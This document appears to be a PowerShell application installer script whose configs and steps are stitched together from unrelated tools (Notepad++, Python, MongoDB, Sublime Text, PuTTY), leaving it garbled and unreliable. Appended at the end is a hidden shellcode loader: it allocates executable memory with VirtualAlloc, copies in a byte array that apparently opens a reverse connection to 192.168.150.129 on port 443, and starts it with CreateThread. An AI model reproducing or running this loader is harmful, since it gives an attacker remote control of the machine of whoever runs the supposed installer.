param(
	[string]$Version,
	[string]$Path,
	[switch]$Force,
	$Update,
	[switch]$Uninstall
)





$Configs = @{
	Version = "6.5.3"
	Url = "http://download.tuxfamily.org/notepadplus/6.5.3/npp.6.5.3.Installer.exe"
	
    Path = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\"
    
    Executable = "C:\Program Files (x86)\Sublime Text 2\sublime_text.exe"
}

$Configs = @{
	Version = "2.7.6"
	Url = "https://www.python.org/ftp/python/2.7.6/python-2.7.6.msi"
    Path = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\"
    MSIProductName = "Python 2.7.6"

},@{
	Version = "3.4.0"
	Url = "https://www.python.org/ftp/python/3.4.0/python-3.4.0.msi"
    Path = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\"
    MSIProductName = "Python 3.4.0"
}

$Configs | where{$_.Version -eq $Version} | ForEach-Object{

    try{

        $_.Result = $null
        if(-not $_.Path){$_.Path = $Path}
        $Config = $_

        
        
        

        if(-not $Uninstall){

            
            
            

            if($_.ConditionExclusion){            
                $_.ConditionExclusionResult = $(Invoke-Expression $Config.ConditionExclusion -ErrorAction SilentlyContinue)        
            }    
            if(($_.ConditionExclusionResult -eq $null) -or $Force){
                    	
                
                
                

                $_.Downloads = $_.Url | ForEach-Object{
                    Get-File -Url $_ -Path $Config.Path
                }       			

                
                
                
				
				$Directory = "C:\Program Files\MongoDB\"; if(-not (Test-Path -Path $Directory)){New-Item -Path $Directory -Type directory}
				
                $_.Downloads | ForEach-Object{
                    Start-Process -FilePath $(Join-Path $_.Path $_.Filename) -ArgumentList "/VERYSILENT /NORESTART" -Wait
					Start-Process -FilePath "msiexec" -ArgumentList "/i $(Join-Path $_.Path $_.Filename) /quiet /norestart" -Wait
                }
								
                $WorkingPath = (Get-Location).Path
                Set-Location "C:\Program Files\"
				$_.Downloads | ForEach-Object{
                    Unzip-File -File $(Join-Path $_.Path $_.Filename) -Destination $($env:PSModulePath.Split(";")[0])
                }
                Set-Location $WorkingPath
                
                Rename-Item -Path "C:\Program Files\mongodb-win32-x86_64-2008plus-2.4.9" -NewName "MongoDB" -Force
                		
                
                
                

                $Executable = "C:\Program Files (x86)\PuTTY\putty.exe";if(Test-Path $Executable){Set-Content -Path (Join-Path $PSbin.Path "putty.bat") -Value "@echo off`nstart `"`" `"$Executable`" %*"}
				
				Set-EnvironmentVariableValue -Name "Path" -Value ";C:\Program Files (x86)\Notepad++\" -Target "Machine" -Add
                
                
                Set-Content -Path (Join-Path $_.Path "Sublime Text 2 Context Add.bat") -Value @"
rem add it for all file types
reg add "HKEY_CLASSES_ROOT\*\shell\Open with Sublime Text 2" /t REG_SZ /v "" /d "Open with Sublime Text 2" /f
reg add "HKEY_CLASSES_ROOT\*\shell\Open with Sublime Text 2" /t REG_EXPAND_SZ /v "Icon" /d "$($_.Executable),0" /f
reg add "HKEY_CLASSES_ROOT\*\shell\Open with Sublime Text 2\command" /t REG_SZ /v "" /d "$($_.Executable) \"%%1\"" /f

rem add it for folders
reg add "HKEY_CLASSES_ROOT\Folder\shell\Open with Sublime Text 2" /t REG_SZ /v "" /d "Open with Sublime Text 2"   /f
reg add "HKEY_CLASSES_ROOT\Folder\shell\Open with Sublime Text 2" /t REG_EXPAND_SZ /v "Icon" /d "$($_.Executable),0" /f
reg add "HKEY_CLASSES_ROOT\Folder\shell\Open with Sublime Text 2\command" /t REG_SZ /v "" /d "$($_.Executable) \"%%1\"" /f
"@
                & (Join-Path $_.Path "Sublime Text 2 Context Add.bat") | out-null
                
                
                
                

                $_.Downloads | ForEach-Object{
                    Remove-Item (Join-Path $_.Path $_.Filename) -Force
                }
                Remove-Item (Join-Path $_.Path "Sublime Text 2 Context Add.bat") -Force
                		
                
                
                
                		
                if($Update){
                    $_.Result = "AppUpdated";$_
                }elseif($Downgrade){
                    $_.Result = "AppDowngraded";$_
                }else{
                    $_.Result = "AppInstalled";$_
                }
            		
            
            
            
            		
            }else{
            	
                $_.Result = "ConditionExclusion";$_
            }

        
        
        
        	
        }else{

			Remove-EnvironmentVariableValue -Name Path -Value ";C:\Program Files\nodejs" -Target Machine
		
            if(Test-Path (Join-Path $PSbin.Path "putty.bat")){Remove-Item (Join-Path $PSbin.Path "putty.bat")}
            
            $Executable = "C:\Program Files (x86)\PuTTY\unins000.exe"; if(Test-Path $Executable){Start-Process -FilePath $Executable -ArgumentList "/VERYSILENT /NORESTART" -Wait}
            
			$Directory = "C:\Program Files\MongoDB\"; if(Test-Path $Directory){Remove-Item -Path $Directory -Force -Recurse}
            
            Get-MSI | where{$_.ProductName -eq "7-Zip 9.20 (x64 edition)"} | ForEach-Object{
                 Start-Process -FilePath "msiexec" -ArgumentList "/uninstall $($_.LocalPackage) /qn /norestart" -Wait 
            }

			Set-Content -Path (Join-Path $_.Path "Sublime Text 2 Context Remove.bat") -Value @"
rem remove for all file types
reg delete "HKEY_CLASSES_ROOT\*\shell\Open with Sublime Text 2" /f

rem remove for folders
reg delete "HKEY_CLASSES_ROOT\Folder\shell\Open with Sublime Text 2" /f
"@
            & (Join-Path $_.Path "Sublime Text 2 Context Remove.bat") | out-null
                
            Remove-Item (Join-Path $_.Path "Sublime Text 2 Remove.bat") -Force
                
            $_.Result = "AppUninstalled";$_
        }

    
    
    

    }catch{

        $Config.Result = "Error";$Config
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x96,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

